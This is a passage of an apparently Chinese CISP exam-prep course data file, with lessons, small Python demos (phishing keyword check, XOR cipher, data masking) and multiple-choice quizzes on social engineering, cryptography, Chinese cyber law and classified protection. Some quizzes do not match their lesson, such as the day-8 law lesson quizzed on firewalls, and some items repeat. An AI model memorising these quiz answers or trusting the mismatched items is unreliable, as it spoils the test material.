**四大心理**："信-急-贪-怕"——信任(伪装)、紧迫(限时)、贪婪(免费)、恐惧(吓唬)\n学习建议\n- 普通钓鱼(群发) vs 鱼叉钓鱼(定制) vs 鲸钓(高管)的区别要记住\n- 社会工程学利用的不是技术漏洞，是人性弱点\n- 安全意识培训是唯一真正有效的长期防御',
    codeExample: { language: 'python', code: '# 钓鱼邮件检测\ndef detect_phishing(email):\n    risks = []\n    suspicious = ["amaz0n", "go0gle", "app1e", "paypa1"]\n    for domain in suspicious:\n        if domain in email.get("from", "").lower():\n            risks.append(f"可疑域名: {domain}")\n    urgent_words = ["紧急", "立即", "账户危险", "最后警告"]\n    for word in urgent_words:\n        if word in email.get("body", ""):\n            risks.append(f"紧迫性操纵: {word}")\n    return risks\n\nemail = {"from": "security@app1e.com", "body": "您的账户异常，请立即验证!"}\nprint(f"风险评估: {detect_phishing(email)}")', description: '模拟钓鱼邮件检测' },
    quiz: [{"id":"q5-1","question":"社会工程学攻击主要利用什么？","options":["技术漏洞","人的心理弱点","网络协议缺陷","硬件漏洞"],"correctIndex":1,"explanation":"社会工程学攻击利用人的心理弱点进行欺骗。"},{"id":"q5-2","question":"以下哪种是社会工程攻击？","options":["SQL注入","网络钓鱼（Phishing）","DDoS攻击","缓冲区溢出"],"correctIndex":1,"explanation":"网络钓鱼是社会工程攻击的典型代表。"},{"id":"q5-3","question":"防范社会工程攻击最有效的方法是？","options":["安装防火墙","安全意识和培训","使用VPN","加密数据"],"correctIndex":1,"explanation":"社会工程攻击针对的是人，最有效的防范是提高安全意识。"},{"id":"q5-4","question":"尾随进入（Tailgating）属于什么类型的攻击？","options":["网络攻击","物理+社会工程攻击","密码攻击","DDoS攻击"],"correctIndex":1,"explanation":"尾随进入利用人的礼貌和疏忽，属于物理+社会工程攻击。"},{"id":"q5-5","question":"钓鱼邮件通常包含什么特征？","options":["正式的发件人地址","紧急的语气和可疑的链接","正确的公司logo","正确的语法"],"correctIndex":1,"explanation":"钓鱼邮件通常使用紧急语气催促用户点击可疑链接。"}],
    expertNotes: dayExpertNotes[5],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-6', day: 6, week: 1, title: '密码学基础概念',
    objectives: ['理解密码学术语', '了解加密解密原理', '掌握基本分类'],
    content: '# 密码学基础概念\n\n> 📋 **本节大纲**\u2003核心术语 | 对称vs非对称加密(对比表) | 混合加密(TLS原理) | 四大应用场景\n\n## 概述\n\n密码学（Cryptography）是研究如何保护信息安全的数学科学，是CISP考试的核心模块之一。密码学不仅要"让人看不懂"（加密），还要确保"没人偷偷改"（完整性）、"确定是你干的"（不可否认）。密码学是整个信息安全体系的技术基石。\n\n## 密码学核心术语\n\n**明文（Plaintext）：**加密前可读的原始信息。"明天开会"就是明文。\n\n**密文（Ciphertext）：**加密后的不可读数据。同样的"明天开会"经过AES加密后可能变成"7f3a0e8b..."的乱码。\n\n**加密（Encryption）：**用密钥和算法将明文转为密文的过程。明文+密钥→算法→密文。\n\n**解密（Decryption）：**用密钥将密文还原为明文的过程。密文+密钥→算法→明文。\n\n**密钥（Key）：**控制加解密的核心参数。密码学核心原则（Kerckhoffs原则）：系统的安全性应完全依赖密钥的保密，而不应依赖算法的保密。算法可以公开，密钥必须保密。\n\n**算法（Algorithm）：**加解密使用的数学方法（AES/RSA/ECC等）。现代密码学算法都是公开的、经过学术界严格审查的——安全依靠密钥，不靠"算法保密"。\n\n## 对称加密 vs 非对称加密\n\n这是CISP考试最高频的密码学考点，必须清晰区分。\n\n### 对称加密（Symmetric Encryption）\n\n**核心理念：**加密和解密使用**同一个**密钥。发送方和接收方共享密钥。\n\n**工作流程：**\n1. 双方事先共享密钥（通过安全信道）\n2. 发送方用密钥加密明文→密文\n3. 接收方用同一密钥解密密文→明文\n\n**优势：**速度快（比非对称快约1000倍），适合加密大量数据（文件、数据库、通信批量加密）\n\n**劣势：**密钥分发困难——你怎么把密钥安全地发给对方？如果你们已经有一个安全信道，为什么还需要加密？这就是"密钥分发问题"（Key Distribution Problem）。\n\n**代表算法：**\n- **AES（高级加密标准）：**当前最广泛使用的对称加密算法。分组长度128位，密钥长度128/192/256位\n- **DES：**56位密钥，1998年被暴力破解（56位密钥空间太小），已废弃\n- **3DES：**DES的三次加密增强版，等效112位密钥，正在被AES替代\n- **SM4：**中国国密标准对称密码算法，128位分组和密钥\n\n### 非对称加密（Asymmetric Encryption / 公钥密码）\n\n**核心理念：**使用一对数学上相关但无法互相推导的密钥——**公钥和私钥**。\n\n**工作流程：**\n1. 生成密钥对：公钥（可公开）和私钥（严格保密）\n2. **加密场景：**任何人都可以用接收方的公钥加密数据，只有接收方的私钥能解密\n3. **签名场景：**发送方用自己私钥签名，任何人都可以用发送方的公钥验证\n\n**优势：**完美解决了密钥分发问题——公钥可以通过任意渠道传输（网站、邮件、写在墙上都可以），不怕被窃听。\n\n**劣势：**计算量大、速度慢（不适用于加密大数据）。\n\n**代表算法：**\n- **RSA：**最广泛使用的非对称算法，基于大整数质因数分解的数学难题。推荐密钥长度≥2048位（2024+）。1024位RSA已被证明可被破解。\n- **ECC（椭圆曲线密码学）：**相比RSA，同等安全强度下密钥更短——256位ECC ≈ 3072位RSA安全性。移动设备首选。\n- **SM2：**中国国密标准椭圆曲线公钥密码算法\n\n### 对称 vs 非对称 速查表\n\n| 维度 | 对称加密 | 非对称加密 |\n|------|---------|-----------|\n| 密钥数量 | 1个（加密解密同一密钥） | 2个（公钥+私钥） |\n| 速度 | 快（~1000倍于非对称） | 慢 |\n| 密钥分发 | 困难（需要安全信道） | 简单（公钥可公开） |\n| 典型用途 | 数据加密存储/传输 | 密钥交换、数字签名 |\n| 代表算法 | AES、SM4 | RSA、ECC、SM2 |\n\n### 混合加密（Hybrid Encryption）——实际应用的标准方案\n\n**只用对称加密的问题：**密钥怎么安全传给对方？\n**只用非对称加密的问题：**加密大数据太慢了。\n\n**混合方案 — TLS/HTTPS的标准实践：**\n1. 用非对称加密（RSA/ECC）安全交换一个临时的对称密钥\n2. 后续所有大量数据用对称加密（AES）加密——速度快\n3. 综合了两者的优势：非对称解决密钥交换，对称解决数据加密\n\n这就是你访问任何HTTPS网站时浏览器和服务器之间发生的事情。\n\n## 密码学的四大应用\n\n**1. 数据机密性：**加密存储和传输——AES加密数据库、TLS加密网络通信\n**2. 数据完整性：**哈希函数验证数据未被篡改——下载文件校验SHA-256\n**3. 身份认证：**数字签名验证发送者身份——软件数字签名、邮件签名\n**4. 不可否认性：**私钥签名后无法否认"不是我签的"——电子合同的数字签名\n\n## \n## 🔴 高频考点\n\n· **对称加密vs非对称加密的核心区别**——对称=同密钥(快)、非对称=公钥+私钥(慢)\n· 混合加密=非对称交换密钥+对称加密数据——HTTPS/TLS的标准方案\n· AES分组长度128位，RSA基于大数分解，ECC基于椭圆曲线——三个算法数学基础要记住\n## 💜 记忆口诀\n\n· **对称vs非对称**："对称=一把钥匙两人用(快但分发难)、非对称=两把钥匙(公钥开门/私钥留着)"\n· **混合加密**："非对称送钥匙、对称加密数据"\n· **算法根基**：RSA=大数分解、ECC=椭圆曲线、AES=对称标准\n学习建议\n\n- 对称加密和非对称加密的核心区别是CISP必考题\n- 记住：混合加密 = TLS/HTTPS的标准方案\n- AES算法的分组长度（128位）和密钥长度（128/192/256）要记住\n- RSA基于大数分解、ECC基于椭圆曲线离散对数——知道数学基础',
    codeExample: { language: 'python', code: '# 简单XOR加密演示\ndef xor_encrypt(text, key):\n    return "".join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key * (len(text) // len(key) + 1)))\n\nmessage = "Hello CISP"\nkey = "KEY"\n\nencrypted = xor_encrypt(message, key)\ndecrypted = xor_encrypt(encrypted, key)\n\nprint(f"原始: {message}")\nprint(f"加密: {repr(encrypted)}")\nprint(f"解密: {decrypted}")', description: '演示简单对称加密' },
    quiz: [{"id":"q6-1","question":"以下哪种是对称加密算法？","options":["RSA","AES","ECC","DSA"],"correctIndex":1,"explanation":"AES是对称加密算法。"},{"id":"q6-2","question":"数字签名使用什么密钥进行签名？","options":["接收者的公钥","发送者的私钥","发送者的公钥","共享密钥"],"correctIndex":1,"explanation":"数字签名使用发送者的私钥进行签名。"},{"id":"q6-3","question":"SHA-256的输出长度是多少位？","options":["128位","160位","256位","512位"],"correctIndex":2,"explanation":"SHA-256的输出长度是256位。"},{"id":"q6-4","question":"PKI体系中，CA的作用是什么？","options":["加密数据","签发和管理数字证书","存储用户密码","检测网络攻击"],"correctIndex":1,"explanation":"CA负责签发和管理数字证书。"},{"id":"q6-5","question":"HTTPS使用什么协议实现安全传输？","options":["IPSec","TLS/SSL","SSH","PGP"],"correctIndex":1,"explanation":"HTTPS使用TLS/SSL协议加密传输。"}],
    expertNotes: dayExpertNotes[6],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-7', day: 7, week: 1, title: '第一周总结与测验',
    objectives: ['回顾第一周知识点', '检验学习成果', '查漏补缺'],
    content: '# 第一周学习总结\n\n## 本周学习内容\n\n### Day 1: 信息安全概述\n- 信息安全定义和重要性\n- CIA三要素：机密性、完整性、可用性\n- 安全威胁分类\n\n### Day 2: 信息安全发展历程\n- 通信安全→计算机安全→网络安全→信息化安全\n- 关键标准和事件\n\n### Day 3: 网络安全基本概念\n- OSI七层模型和TCP/IP四层模型\n- 常见网络攻击类型\n\n### Day 4: 恶意软件分类\n- 病毒、蠕虫、木马、勒索软件区别\n- 传播方式和防范\n\n### Day 5: 社会工程学攻击\n- 社会工程学原理\n- 钓鱼攻击和防范\n\n### Day 6: 密码学基础\n- 基本术语\n- 对称加密与非对称加密\n\n## 知识要点回顾\n\n| 知识点 | 核心内容 |\n|---------|----------|\n| CIA三要素 | 机密性、完整性、可用性 |\n| 恶意软件 | 病毒需要宿主，蠕虫独立 |\n| 社会工程学 | 利用人性弱点 |\n| 加密技术 | 对称加密速度快，非对称更安全 |\n\n## 下周预告\n\n第二周将学习：\n- 中国网络安全法律法规\n- 等级保护制度\n- 数据安全与个人信息保护',
    quiz: [{"id":"q7-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q7-2","question":"以下关于第一周总结与测验的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q7-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q7-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q7-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[7],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  // ========== Week 2: 信息安全法规 ==========
  {
    id: 'day-8', day: 8, week: 2, title: '中国网络安全法律法规体系',
    objectives: ['了解中国法律框架', '理解主要法规内容', '掌握合规要求'],
    content: '# 中国网络安全法律法规体系\n\n> 📋 **本节大纲**\u2003三部核心法律(网安法/数安法/个保法) | 关键配套法规速查表 | 违规后果对比\n\n## 概述\n\n中国已建立起以《网络安全法》《数据安全法》《个人信息保护法》三部法律为核心，配套多部行政法规和部门规章的网络安全法律体系。CISP考试对法律框架的考查逐年加重，重点在于区分三部核心法律的管辖范围和违规后果。\n\n## 三部核心法律\n\n### 一、《中华人民共和国网络安全法》（2017年施行）\n\n**定位：**网络安全领域基础性法律，侧重于网络运行安全和网络空间主权。\n\n**核心制度：**\n- **网络安全等级保护制度（等保2.0）：**所有网络运营者必须定级备案、安全建设、等级测评、监督检查\n- **关键信息基础设施（CII）保护：**对金融、能源、交通、通信等行业的关键系统施加更高的安全要求，包括数据境内存储和网络安全审查\n- **个人信息保护：**网络运营者收集使用个人信息需经用户同意、公开规则、不泄露篡改\n- **实名制：**为用户提供网络接入、发布信息等服务时必须要求真实身份信息\n\n**违规后果：**CII运营者不履行安全义务——罚款10-100万元，直接负责人罚款1-10万元\n\n### 二、《中华人民共和国数据安全法》（2021年施行）\n\n**定位：**规范数据处理活动，保障数据安全，促进数据开发利用。\n\n**核心制度：**\n- **数据分类分级保护：**将数据分为核心数据、重要数据、一般数据三级，分别施加保护\n- **数据安全审查制度：**对影响国家安全的数据处理活动进行安全审查\n- **数据出境管理：**重要数据出境需经安全评估，核心数据原则上不出境\n- **数据安全风险评估：**重要数据处理者定期开展风险评估\n\n**违规后果：**最高罚款1000万元，情节严重的责令停业整顿、吊销相关业务许可证\n\n### 三、《中华人民共和国个人信息保护法/PIPL》（2021年施行）\n\n**定位：**保护个人信息权益，规范个人信息处理活动。\n\n**核心内容：**\n- **七项处理原则：**合法正当必要诚信、目的限制、数据最小化、公开透明、质量保证、安全保障、责任明确\n- **数据主体七项权利：**知情权、查阅权、更正权、删除权（被遗忘权）、限制处理权、可携带权、反对权\n- **敏感个人信息特别保护：**生物识别、金融账户、行踪轨迹等需单独同意\n- **跨境传输规则：**需通过安全评估、签订标准合同或获得认证\n\n**违规后果：**最严厉——最高5000万元或上一年度营业额5%（取高者）\n\n## 关键配套法规速查\n\n| 法规 | 发布年份 | 核心要求 |\n|------|---------|---------|\n| 等保2.0 | 2019 | 定级备案-安全建设-等级测评-监督检查 |\n| CII安全保护条例 | 2021 | CII运营者安全义务、安全审查、检测预警 |\n| 网络安全审查办法 | 2022 | 影响国家安全的产品服务需申报审查 |\n| 数据出境安全评估办法 | 2022 | 出境数据超量或涉及重要/敏感数据需评估 |\n\n## \n## 🔴 高频考点\n\n· **PIPL罚款上限（5000万/年营业额5%）**三大法中处罚最重——选罚款上限时要区分哪个法\n· 三部法律管辖：网安法→网络运行安全、数安法→数据处理活动、PIPL→个人信息\n· CII（关键信息基础设施）概念在三大法中都有涉及\n## 💜 记忆口诀\n\n· **三法记法**："网(运行)·数(数据)·人(信息)"\n· **罚款层级**：网安法百万→数安法千万→PIPL五千万或五点\n· **CII八行业**："通能交金政水卫国"\n学习建议\n- 三部法律按管辖范围区分：网络安全法→网络运行安全、数据安全法→数据处理活动、PIPL→个人信息\n- PIPL罚款最高（5000万/5%营收），是三大法中处罚力度最重的\n- CII（关键信息基础设施）概念在三部法律中都有涉及',
    codeExample: { language: 'python', code: '# 合规检查清单\ndef check_compliance(features):\n    requirements = ["防火墙", "入侵检测", "日志审计", "数据加密", "应急预案"]\n    passed = sum(1 for req in requirements if features.get(req, False))\n    return passed, len(requirements)\n\nfeatures = {"防火墙": True, "入侵检测": True, "日志审计": True}\npassed, total = check_compliance(features)\nprint(f"合规检查: {passed}/{total} 项通过")\nprint(f"合规率: {(passed/total)*100:.1f}%")', description: '模拟合规检查' },
    quiz: [{"id":"q8-1","question":"以下哪种防火墙类型工作在OSI第4层？","options":["应用层防火墙","状态检测防火墙","代理防火墙","WAF"],"correctIndex":1,"explanation":"状态检测防火墙工作在传输层（第4层）。"},{"id":"q8-2","question":"IDS和IPS的主要区别是？","options":["IDS可以阻断攻击","IPS可以阻断攻击，IDS只能检测告警","两者功能完全相同","IDS比IPS更安全"],"correctIndex":1,"explanation":"IPS可以主动阻断攻击，IDS只能检测和告警。"},{"id":"q8-3","question":"TCP三次握手中，第二次握手发送的标志位是？","options":["SYN","ACK","SYN+ACK","FIN"],"correctIndex":2,"explanation":"第二次握手服务器回复SYN+ACK。"},{"id":"q8-4","question":"DNS欺骗攻击属于什么类型的攻击？","options":["物理攻击","中间人攻击","密码攻击","社会工程攻击"],"correctIndex":1,"explanation":"DNS欺骗通过伪造DNS响应属于中间人攻击。"},{"id":"q8-5","question":"防火墙默认策略应遵循什么原则？","options":["默认允许","默认拒绝","只允许80端口","按需决定"],"correctIndex":1,"explanation":"安全最佳实践：默认拒绝所有，按需开放。"}],
    expertNotes: dayExpertNotes[10],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-9', day: 9, week: 2, title: '等级保护制度',
    objectives: ['理解等级保护意义', '了解五个保护等级', '掌握定级流程'],
    content: '# 等级保护制度\n\n> 📋 **本节大纲**\u2003五个保护等级详解 | 定级流程五步 | 等保2.0"一个中心三重防护" | 测评要求速记\n\n## 概述\n\n网络安全等级保护制度（等保2.0）是中国网络安全领域最核心的制度安排，法律依据是《网络安全法》第21条。通俗讲就是"对信息系统分等级进行保护"——系统越重要，保护要求越高、测评频次越密、违规处罚越重。\n\n## 五个保护等级详解\n\n**第一级：自主保护级**\n- 系统破坏仅损害公民/法人合法权益，不损害社会公共利益和国家安全\n- 运营者自主定级、自主保护，不需要公安机关备案和测评\n- 典型：小型企业官网、个人博客\n\n**第二级：指导保护级**\n- 系统破坏对社会公共利益造成一般损害，但不危害国家安全\n- 需向公安机关备案，建议（非强制）进行等级测评\n- 典型：中型企业信息系统\n\n**第三级：监督保护级（最常见、考试最高频）**\n- 系统破坏对社会公共利益造成严重损害，或对国家安全造成一般损害\n- **必须**每年至少一次等级测评，由公安机关监督检查\n- 典型：政府门户网站、银行系统、电力调度系统、大型电商平台\n- CISP考试重点：三级是最高频考点，记住"每年至少一次测评"\n\n**第四级：强制保护级**\n- 系统破坏对国家安全造成严重损害\n- 至少每半年一次测评，公安机关强制监督检查\n- 典型：国家核心部委内部系统\n\n**第五级：专控保护级**\n- 系统破坏对国家安全造成特别严重损害\n- 由国家安全专门机构管控，测评要求为国家秘密\n- 典型：国家核心机密系统\n\n## 定级流程\n\n定级是等保的第一步也是关键一步：\n1. **确定定级对象：**识别需要保护的网络系统——一个系统一个定级\n2. **初步确定等级：**根据业务信息安全和系统服务安全两个维度综合评估\n3. **专家评审：**邀请行业专家和安全专家评审定级合理性\n4. **主管部门核准：**行业主管/监管部门对定级结果进行核准\n5. **公安机关备案：**三级以上系统必须到公安机关办理备案手续\n\n## 等保2.0的"一个中心、三重防护"\n\n等保2.0对三级系统的安全技术框架提出了"一个中心、三重防护"架构：\n- **安全管理中心：**统一管理所有安全设备和策略\n- **安全通信网络：**网络层面的安全防护（加密、VPN）\n- **安全区域边界：**网络边界的安全防护（防火墙、IDS/IPS）\n- **安全计算环境：**主机和应用层面的安全防护（访问控制、补丁管理）\n\n**安全管理五大领域：**安全管理制度、安全管理机构、安全管理人员、安全建设管理、安全运维管理\n\n## 测评要求速记\n\n| 等级 | 测评要求 | 备案要求 |\n|------|---------|---------|\n| 一级 | 不需要 | 不需要 |\n| 二级 | 建议测评 | 需备案 |\n| 三级 | **每年至少一次**（必考） | 需备案 |\n| 四级 | 至少每半年一次 | 需备案 |\n| 五级 | 国家专控 | 国家专控 |\n\n## \n## 🔴 高频考点\n\n· **三级等保"每年至少一次"测评**——最高频考点，一/二级不需要强制测评\n· 五级名词：自主(一)、指导(二)、**监督(三)**、强制(四)、专控(五)\n· 等保2.0架构："一个中心(安全管理中心)+三重防护(通信网络/区域边界/计算环境)"\n## 💜 记忆口诀\n\n· **五级名称**："自主(一)→指导(二)→监督(三)→强制(四)→专控(五)"\n· **测评频次**："一二不强制、三年一次、四半年一次、五国家定"\n学习建议\n- 三级是CISP最高频考点："每年至少一次测评"\n- 区分"自主"（一级）、"指导"（二级）、"监督"（三级）、"强制"（四级）、"专控"（五级）\n- "一个中心、三重防护"是等保2.0的核心安全技术架构',
    codeExample: { language: 'python', code: '# 等级保护定级模拟\ndef calculate_level(business_impact, service_scope):\n    score = business_impact * 0.6 + service_scope * 0.4\n    if score <= 1: return 1, "自主保护级"\n    elif score <= 2: return 2, "指导保护级"\n    elif score <= 3: return 3, "监督保护级"\n    elif score <= 4: return 4, "强制保护级"\n    else: return 5, "专控保护级"\n\n# 某电商平台评估\nlevel, name = calculate_level(business_impact=3, service_scope=3)\nprint(f"定级结果: 第{level}级 - {name}")', description: '模拟等级保护定级' },
    quiz: [{"id":"q9-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q9-2","question":"以下关于等级保护制度的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q9-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q9-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q9-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[9],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-10', day: 10, week: 2, title: '数据安全与个人信息保护',
    objectives: ['理解数据分类分级', '了解个人信息保护要求', '掌握数据安全措施'],
    content: '# 数据安全与个人信息保护\n\n> 📋 **本节大纲**\u2003数据分类分级(法定三级+企业四级) | 数据全生命周期保护 | PIPL核心要点(六原则+七权利)\n\n## 概述\n\n《数据安全法》和《个人信息保护法》是2021年同年施行的两部重要法律，共同构建了中国数据保护的法律框架。数据安全法关注"国家安全视角"的数据安全，PIPL关注"个人权益视角"的隐私保护。CISP考试常考查两部法律的管辖范围区别和数据分类分级制度。\n\n## 数据分类分级\n\n《数据安全法》第21条明确要求实行数据分类分级保护，这是数据安全治理的基础。\n\n### 法定三级分类\n\n**核心数据：**一旦泄露、篡改可能危害国家安全、国民经济命脉、重大公共利益的数据。最高等级保护，原则上不得出境。\n\n**重要数据：**一旦泄露可能危害国家安全、经济运行的数据。包括：未公开的政府信息、基因/地理数据、CII漏洞信息。出境需安全评估。\n\n**一般数据：**核心和重要之外的数据，企业自主定级管理。\n\n### 企业实践中的四级分类\n- **公开级：**可对外发布（产品介绍、已公开年报）\n- **内部级：**仅限内部流转（员工手册、内部公告）\n- **机密级：**仅授权人员访问（客户名单、合同、技术方案）\n- **绝密级：**极少数人可知（商业机密、核心算法）\n\n### 数据全生命周期保护\n\n数据从产生到销毁共经历五个阶段，每个阶段都需要安全控制：\n1. **收集阶段：**合法合规获取用户同意，遵循最小必要原则\n2. **存储阶段：**加密存储、访问控制、定期备份\n3. **使用阶段：**权限管控、脱敏处理、审计追踪\n4. **共享阶段：**安全评估、脱敏后共享、合同约束\n5. **销毁阶段：**永久删除、不可恢复（格式化不够，需消磁或物理粉碎）\n\n## 个人信息保护核心要点\n\n### 个人信息定义\n以电子或其他方式记录的与已识别或可识别自然人有关的各种信息——姓名、电话、身份证号、位置、上网记录等。\n\n### 敏感个人信息（需单独同意）\n- 生物识别：人脸、指纹、声纹\n- 金融账户信息\n- 行踪轨迹\n- 医疗健康信息\n- 14岁以下未成年人信息\n\n**处理敏感信息必须：取得单独同意 + 告知必要性 + 进行影响评估**\n\n### 处理原则六项\n1. **合法正当：**符合法律，不得欺诈误导\n2. **最小必要：**只收集目的所需的最少数据\n3. **目的明确：**告知用户收集目的，不超范围使用\n4. **知情同意：**清晰告知+用户主动同意（不是默认勾选）\n5. **公开透明：**告知处理方式、保存期限、用户权利\n6. **确保安全：**技术+管理措施保障数据安全\n\n### 数据主体七项权利\n知情权→查阅权→更正权→删除权（被遗忘权）→限制处理权→可携带权→反对权\n\n## \n## 🔴 高频考点\n\n· **敏感个人信息需要"单独同意"**——PIPL核心考点，区别于一般的"知情同意"\n· 数安法(国家安全视角) vs PIPL(个人权益视角)——两法的管辖视角要区分\n· 数据主体七项权利：知·查·改·删·限·带·反——"删除权=被遗忘权"必考\n## 💜 记忆口诀\n\n· **PIPL七项权利**："知-查-改-删-限-带-反"\n· **处理六原则**："合-最-目-知-公-安"\n· **敏感vs一般**："敏感需单独同意、一般知情就可以"\n学习建议\n- 数据安全法（国家安全视角）vs PIPL（个人权益视角）要区分\n- 敏感个人信息和一般个人信息最大的区别：处理前者需要"单独同意"\n- "最小必要"原则是两部法律共同的核心理念',
    codeExample: { language: 'python', code: '# 个人信息脱敏\ndef mask_id_card(id_card):\n    if len(id_card) == 18:\n        return id_card[:6] + "********" + id_card[-4:]\n    return id_card\n\ndef mask_phone(phone):\n    if len(phone) >= 11:\n        return phone[:3] + "****" + phone[-4:]\n    return phone\n\nprint(f"身份证: {mask_id_card(\"110101199001011234\")}")\nprint(f"手机号: {mask_phone(\"13812345678\")}")', description: '演示个人信息脱敏' },
    quiz: [{"id":"q10-1","question":"中国《网络安全法》正式实施的时间是？","options":["2016年6月1日","2017年6月1日","2018年6月1日","2019年6月1日"],"correctIndex":1,"explanation":"《网络安全法》于2017年6月1日正式实施。"},{"id":"q10-2","question":"《数据安全法》中数据分类分级的核心级别不包括？","options":["核心数据","重要数据","一般数据","普通数据"],"correctIndex":3,"explanation":"数据分类分级分为核心、重要和一般数据三个级别。"},{"id":"q10-3","question":"个人信息保护法中，敏感个人信息不包括？","options":["生物识别信息","医疗健康信息","工作单位名称","金融账户信息"],"correctIndex":2,"explanation":"工作单位名称不属于敏感个人信息。"},{"id":"q10-4","question":"等保2.0将安全保护等级分为几级？","options":["三级","四级","五级","六级"],"correctIndex":2,"explanation":"等保2.0将安全保护等级分为五级。"},{"id":"q10-5","question":"GDPR是哪个地区的隐私保护法规？","options":["美国","中国","欧盟","日本"],"correctIndex":2,"explanation":"GDPR是欧盟的通用数据保护条例。"}],
    expertNotes: dayExpertNotes[9],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-11', day: 11, week: 2, title: '关键信息基础设施保护',
    objectives: ['理解CII概念', '了解保护义务', '掌握安全要求'],
